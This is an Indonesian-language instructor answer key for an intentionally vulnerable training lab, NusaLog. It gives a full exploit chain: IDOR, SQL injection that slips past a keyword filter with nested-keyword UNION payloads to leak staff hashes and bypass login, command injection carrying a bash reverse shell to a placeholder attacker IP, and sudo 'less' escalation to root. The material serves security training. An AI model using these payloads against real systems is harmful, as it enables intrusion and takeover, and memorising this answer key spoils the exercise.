# Kunci Jawaban Instruktur - Lab NusaLog

> **Dokumen ini TIDAK ikut di-deploy ke dalam OVA.** Hanya untuk instruktur/penilai.
> Semua payload di bawah sudah diuji end-to-end (lihat `docs/TESTING.md`) terhadap
> stack Apache+PHP+MySQL yang identik dengan yang dipasang provisioning scripts.

Total temuan yang harus dilaporkan peserta: **4** (3 kerentanan web + 1 privilege
escalation level host).

---

## 1. IDOR - `track.php` (Broken Access Control)

**Endpoint:** `GET /track.php?tracking_id=<id>`

Endpoint publik tanpa autentikasi, `tracking_id` adalah integer sekuensial, query
`SELECT *` tanpa pengecekan kepemilikan. Peserta bisa mengiterasi ID (mis.
100001-100024) untuk melihat data pengiriman customer lain.

**Bukti/PoC:**
```
GET /track.php?tracking_id=100013
```
Mengembalikan detail pengiriman "PT Sinar Abadi Jaya" termasuk kolom `internal_remarks`
yang berisi petunjuk naratif ke keberadaan sistem internal staf - nudge menuju
temuan #2, bukan jawaban langsung.

**Kontras yang disengaja:** `dashboard.php` (setelah login customer resmi) melakukan
query yang di-scope benar (`WHERE customer_id = ?`, kolom eksplisit tanpa
`internal_remarks`) - jadi IDOR ini adalah kesalahan spesifik di satu endpoint,
bukan kerentanan menyeluruh di semua fitur.

---

## 2. SQL Injection filter-bypass - `search.php` & `staff-x7k2/login.php`

**Filter yang cacat:** `app/www/includes/sanitize.php` - `nusalog_filter_input()`
membuang kata kunci berbahaya (`union`, `select`, dll.) dalam **satu kali pass**
(`str_ireplace`, non-recursive). Kata kunci yang diselipkan di tengah kata kunci
itu sendiri akan bereformasi menjadi valid setelah sisanya digabung.

**Teknik bypass (nested keyword):**
```
SelSELECTect   ->  Select      (setelah "SELECT" tengah dihapus, sisa "Sel"+"ect")
UNIunionON     ->  UNION       (setelah "union" tengah dihapus, sisa "UNI"+"ON")
```
Kata kunci `--`, `#`, `/*`, `*/` (komentar SQL) **sengaja tidak bisa** dibypass
dengan teknik ini (karakter berulang tidak reform dengan cara yang sama) - peserta
harus menyusun query yang valid secara sintaksis tanpa komentar sama sekali.

### 2a. Konfirmasi teknik via `search.php` (data exposure, opsional)

```
GET /search.php?q=zzz' UNIunionON SELselectECT (SELselectECT username FROM staff LIMIT 1),(SELselectECT password_hash FROM staff LIMIT 1),'x','x','LEAK
```
Setelah difilter menjadi:
```sql
...WHERE recipient_name LIKE '%zzz' UNION SELECT (SELECT username FROM staff LIMIT 1),(SELECT password_hash FROM staff LIMIT 1),'x','x','LEAK'
```
Membocorkan `username` + `password_hash` (bcrypt) akun staff lewat tabel hasil
pencarian publik. Ini membuktikan teknik bypass bekerja sebelum peserta
menyerang target sebenarnya (auth bypass di staff portal).

### 2b. Target sebenarnya: bypass login `staff-x7k2/login.php`

Field `username` dirangkai mentah ke query (tanpa prepared statement), field
`password` **tidak** masuk ke SQL - dicocokkan lewat `password_verify()` di PHP
setelah baris ditemukan. Karena itu, teknik paling bersih adalah UNION SELECT
yang menyisipkan baris palsu berisi bcrypt hash yang **penyerang tahu plaintext-nya
sendiri** (dibuat offline dengan `password_hash()`), lalu login pakai plaintext
tersebut.

**PoC (sudah diverifikasi bekerja, HTTP 302 -> dashboard staff sebagai admin):**

- Hash bcrypt untuk plaintext `P4ssw0rd!inject` (contoh yang sudah diuji):
  `$2y$12$2QxLC2iWYn/sPDWt41UDKeYEuaIrRj7wIBgUoE/83v/0ouYVhA3Na`
  *(peserta membuat hash sendiri lewat `php -r "echo password_hash('apapun', PASSWORD_BCRYPT);"`
  di mesin mereka - tidak perlu tahu password asli akun staff manapun.)*

- POST ke `/staff-x7k2/login.php`:
  - `username` = 
    ```
    nonexistent' UNIunionON SELselectECT 1,'attacker','Injected Staff','admin','$2y$12$2QxLC2iWYn/sPDWt41UDKeYEuaIrRj7wIBgUoE/83v/0ouYVhA3Na
    ```
  - `password` = `P4ssw0rd!inject`

  Setelah filter, username menjadi:
  ```
  nonexistent' UNION SELECT 1,'attacker','Injected Staff','admin','$2y$12$2QxLC2iWYn/sPDWt41UDKeYEuaIrRj7wIBgUoE/83v/0ouYVhA3Na
  ```
  Tanda kutip penutup dari template query sendiri (`... = '$username'`) menutup
  string literal terakhir ini - tidak perlu komentar SQL sama sekali.

**Kalibrasi kesulitan (sudah diverifikasi):** payload naif seperti
`admin' OR 1=1 -- `, `admin' OR '1'='1`, atau `admin'-- ` **semuanya gagal**
(tetap HTTP 200 / tetap di halaman login) karena kata kunci `or`/`and`/komentar
diblokir filter dan tidak reform dengan cara sederhana. Butuh teknik nested-keyword
di atas untuk berhasil.

**Recon hook:** staf portal ada di `/staff-x7k2/`, tidak ditaut di navigasi publik,
hanya disebut di `robots.txt` (`Disallow: /staff-x7k2/`).

---

## 3. Command Injection -> shell `www-data` - `staff-x7k2/courier-check.php`

Setelah login staff (lewat bypass #2), menu "Cek Status Kurir" menjalankan:
```php
shell_exec('ping -c 1 -W 2 ' . $host . ' 2>&1');
```
tanpa `escapeshellarg()`/`escapeshellcmd()`.

**PoC:**
```
POST /staff-x7k2/courier-check.php
host=127.0.0.1; id
```
Field `host` bisa diisi payload reverse shell standar, mis.:
```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
```
Shell yang didapat berjalan sebagai **`www-data`** (bukan root) - dikonfirmasi
lewat `id` yang mengembalikan `uid=33(www-data) gid=33(www-data)`.

---

## 4. Privilege Escalation www-data -> root - sudo NOPASSWD misconfig

**Enumerasi pertama setelah dapat shell:**
```
sudo -l
```
Menampilkan:
```
User www-data may run the following commands on nusalog-srv:
    (root) NOPASSWD: /usr/bin/less /var/log/apache2/*.log
```
Rule ini dipasang lewat `/etc/sudoers.d/www-data-logs` (narasi: staf perlu
meninjau log Apache tanpa akses root penuh - lihat `packer/scripts/06-configure-sudo-misconfig.sh`).

**Eksploitasi (teknik GTFOBins standar untuk `less`):**
```
sudo less /var/log/apache2/access.log
```
Di dalam pager, ketik:
```
!/bin/sh
```
Ini akan membuka shell yang berjalan sebagai **root** (`less` mewarisi hak sudo
saat menjalankan shell-escape bawaannya). Sudah diverifikasi lewat simulasi pty
(`script`) yang mengembalikan `uid=0(root) gid=0(root) groups=0(root)`.

---

## Ringkasan Rantai Eksploitasi

```
Recon (nmap -p- + robots.txt)
   -> IDOR di track.php (info leak + nudge ke staff portal)
   -> SQLi filter-bypass (nested keyword) di staff-x7k2/login.php -> auth bypass
   -> Command injection di courier-check.php -> shell sebagai www-data
   -> sudo -l -> less GTFOBins -> root shell
```
